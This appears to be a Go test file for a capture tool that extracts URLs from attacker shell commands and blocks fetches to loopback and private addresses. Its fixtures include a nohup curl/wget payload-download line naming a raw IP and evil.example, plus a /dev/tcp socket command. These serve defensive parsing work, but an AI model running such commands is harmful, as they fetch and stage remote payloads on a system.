package capture

import "testing"

func TestExtractURLs(t *testing.T) {
	cmd := `nohup $SHELL -c "curl http://121.41.40.112:8231/linux -o /tmp/QwiseFryoC; wget http://evil.example/x"`
	got := ExtractURLs(cmd)
	if len(got) < 2 {
		t.Fatalf("expected >=2 urls, got %v", got)
	}
	if got[0] != "http://121.41.40.112:8231/linux" {
		t.Fatalf("unexpected first url: %q", got[0])
	}
}

func TestExtractURLsDevTCP(t *testing.T) {
	got := ExtractURLs(`exec 6<>/dev/tcp/10.0.0.5/8080 && echo GET >&6`)
	if len(got) != 1 || got[0] != "http://10.0.0.5:8080/" {
		t.Fatalf("got %v", got)
	}
}

func TestBlockedPrivateIP(t *testing.T) {
	if err := assertSafeURL("http://127.0.0.1/malware", nil); err == nil {
		t.Fatal("expected block for loopback")
	}
	if err := assertSafeURL("http://192.168.1.1/x", nil); err == nil {
		t.Fatal("expected block for RFC1918")
	}
}
